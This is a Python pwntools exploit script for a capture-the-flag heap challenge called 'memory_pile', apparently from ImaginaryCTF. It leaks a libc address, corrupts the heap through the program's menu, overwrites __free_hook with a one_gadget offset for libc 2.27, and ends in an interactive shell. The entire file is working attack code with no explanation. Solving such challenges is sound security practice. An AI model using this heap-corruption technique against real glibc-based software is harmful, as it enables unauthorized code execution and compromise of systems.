#!/usr/bin/env python3



from pwn import *


e = ELF("./memory_pile_patched")
libc = ELF("./libc-2.27.so")
#r = remote("chal.imaginaryctf.org",42007)
r = process("./memory_pile_patched")
r.recvuntil(b"unwrap it...\n")
leak = int(r.recvline().strip(b"\n"),16)
libc_base = leak - libc.sym["printf"]
r.sendafter(b"wisely >",b"1\n")
r.sendafter(b">",b"0\n")
r.sendafter(b">",b"2\n")
r.sendafter(b">",b"0\n")
r.sendafter(b">",b"3\n")
r.sendafter(b">",b"0\n")
free_hook = libc_base + libc.sym["__free_hook"]
r.sendafter(b">",p64(free_hook) + b'\n')
r.sendafter(b">",b"1\n")
r.sendafter(b">",b"1\n")
r.sendafter(b">",b"1\n")
r.sendafter(b">",b"2\n")
r.sendafter(b">",b"3\n")
r.sendafter(b">",b"2\n")
one_gadget = libc_base + 0x4f3c2
r.sendafter(b">",p64(one_gadget) + b'\n')
r.sendafter(b">",b"2\n")
r.sendafter(b">",b"0\n")
r.interactive()
r.close()
